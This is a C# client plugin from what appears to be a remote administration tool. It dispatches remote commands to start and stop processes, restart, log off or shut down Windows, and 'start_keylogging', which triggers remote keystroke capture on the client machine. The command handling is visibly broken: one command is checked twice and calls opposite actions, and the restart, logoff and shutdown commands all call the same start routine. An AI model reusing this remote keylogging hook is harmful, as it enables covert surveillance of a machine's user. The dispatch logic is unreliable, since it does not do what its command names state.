using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PaceCommon;
using Message = PaceCommon.Message;

namespace ExternalControl
{
    class ClientPlugin : IClientPlugin
    {
        private Panel _mainPanel;
        private MessageQueue _messageQueue;
        private ClientControl _control;
        private ClientModel _model;
        private ClientView _view;
        private string _name;
        private Form _mainForm;
        private ConnectionTable _connectionTable;

        delegate void PluginCallback();
        
        public IView GetView()
        {
            return _view;
        }

        public IControl GetControl()
        {
            return _control;
        }

        public IModel GetModel()
        {
            return _model;
        }

        [STAThread]
        public void Start()
        {
            _control = new ClientControl();
            _model = new ClientModel();
            _view = new ClientView();
        }

        public void Test()
        {
            TraceOps.Out("ExternalControl Client Plugin");
        }

        public string Name()
        {
            return _name;
        }

        public void SetName(ref string name)
        {
            _name = name;
            _control.SetName(ref name);
        }

        public void SetQueue(ref MessageQueue messageQueue)
        {
            _messageQueue = messageQueue;
            _control.SetQueue(ref messageQueue);
        }

        public void SetTable(ref ConnectionTable connectionTable)
        {
            _connectionTable = connectionTable;
            _control.SetTable(ref connectionTable);
        }

        public void SetForm(Form mainForm)
        {
            _mainForm = mainForm;
            _control.SetForm(mainForm);
        }

        public void SetPanel(Panel mainPanel)
        {
            _mainPanel = mainPanel;
            _control.SetPanel(mainPanel);
        }

        public void SetTask(Message message)
        {
            TraceOps.Out("ExternalControl Client recived Message: " + message.GetCommand());
            if (message.GetCommand() == "start_externalcontrol")
            {
                var d = new PluginCallback(_control.RemoteStartProcess);
                _mainForm.Invoke(d, new object[] { });
            }

            if (message.GetCommand() == "start_externalcontrol")
            {
                var d = new PluginCallback(_control.RemoteStopProcess);
                _mainForm.Invoke(d, new object[] { });
            }

            if (message.GetCommand() == "restart_windows")
            {
                var d = new PluginCallback(_control.RemoteStartProcess);
                _mainForm.Invoke(d, new object[] { });
            }

            if (message.GetCommand() == "logoff_windows")
            {
                var d = new PluginCallback(_control.RemoteStartProcess);
                _mainForm.Invoke(d, new object[] { });
            }

            if (message.GetCommand() == "shutdown_windows")
            {
                var d = new PluginCallback(_control.RemoteStartProcess);
                _mainForm.Invoke(d, new object[] { });
            }

            if (message.GetCommand() == "start_keylogging")
            {
                var d = new PluginCallback(_control.RemoteKeyLogging);
                _mainForm.Invoke(d, new object[] { });
            }
        }

        public EventHandler SetEventHandler(object sender, EventArgs args)
        {
            return delegate
            {
                //MessageBox.Show("Test" + sender.ToString());
            };
        }
    }
}
